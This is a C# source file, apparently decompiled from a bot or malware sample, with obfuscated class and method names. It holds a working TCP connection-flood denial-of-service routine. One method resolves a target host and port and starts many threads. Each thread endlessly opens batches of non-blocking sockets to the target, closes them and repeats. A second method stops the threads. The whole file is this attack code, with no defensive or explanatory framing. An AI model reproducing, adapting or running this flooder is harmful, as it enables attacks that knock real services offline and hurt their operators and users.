using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

internal class Class9
{
	private class Class10
	{
		private IPEndPoint ipendPoint_0;

		private Socket[] socket_0;

		private int int_0;

		public Class10(IPEndPoint ipendPoint_1, int int_1)
		{
			ipendPoint_0 = ipendPoint_1;
			int_0 = int_1;
		}

		public void method_0(IAsyncResult iasyncResult_0)
		{
		}

		public void method_1()
		{
			checked
			{
				while (true)
				{
					try
					{
						socket_0 = new Socket[int_0 - 1 + 1];
						int num = int_0 - 1;
						for (int i = 0; i <= num; i++)
						{
							socket_0[i] = new Socket(ipendPoint_0.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
							socket_0[i].Blocking = false;
							AsyncCallback callback = method_0;
							socket_0[i].BeginConnect(ipendPoint_0, callback, socket_0[i]);
						}
						Thread.Sleep(100);
						int num2 = int_0 - 1;
						for (int i = 0; i <= num2; i++)
						{
							if (socket_0[i].Connected)
							{
								socket_0[i].Disconnect(reuseSocket: false);
							}
							socket_0[i].Close();
							socket_0[i] = null;
						}
						socket_0 = null;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						int num3 = int_0 - 1;
						for (int i = 0; i <= num3; i++)
						{
							try
							{
								if (socket_0[i].Connected)
								{
									socket_0[i].Disconnect(reuseSocket: false);
								}
								socket_0[i].Close();
								socket_0[i] = null;
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	private static ThreadStart[] threadStart_0;

	private static Thread[] thread_0;

	public static string string_0;

	private static IPEndPoint ipendPoint_0;

	public static int int_0;

	private static Class10[] class10_0;

	public static int int_1;

	public static int int_2;

	public static void smethod_0()
	{
		try
		{
			ipendPoint_0 = new IPEndPoint(Dns.GetHostEntry(string_0).AddressList[0], int_0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ipendPoint_0 = new IPEndPoint(IPAddress.Parse(string_0), int_0);
			ProjectData.ClearProjectError();
		}
		checked
		{
			thread_0 = new Thread[int_2 - 1 + 1];
			threadStart_0 = new ThreadStart[int_2 - 1 + 1];
			class10_0 = new Class10[int_2 - 1 + 1];
			int num = int_2 - 1;
			for (int i = 0; i <= num; i++)
			{
				class10_0[i] = new Class10(ipendPoint_0, int_1);
				threadStart_0[i] = class10_0[i].method_1;
				thread_0[i] = new Thread(threadStart_0[i]);
				thread_0[i].Start();
			}
		}
	}

	public static void smethod_1()
	{
		checked
		{
			int num = int_2 - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					thread_0[i].Abort();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
